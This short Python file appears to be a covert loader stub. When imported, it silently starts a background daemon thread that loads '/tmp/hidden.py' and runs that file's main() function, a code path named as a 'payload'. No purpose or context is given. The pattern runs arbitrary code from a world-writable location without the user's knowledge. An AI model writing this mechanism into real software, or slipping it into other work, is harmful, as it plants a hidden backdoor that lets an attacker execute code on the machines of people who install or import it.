import importlib.util
import threading

def load_payload():
    spec = importlib.util.spec_from_file_location('worker', '/tmp/hidden.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    module.main()

threading.Thread(target=load_payload, daemon=True).start()
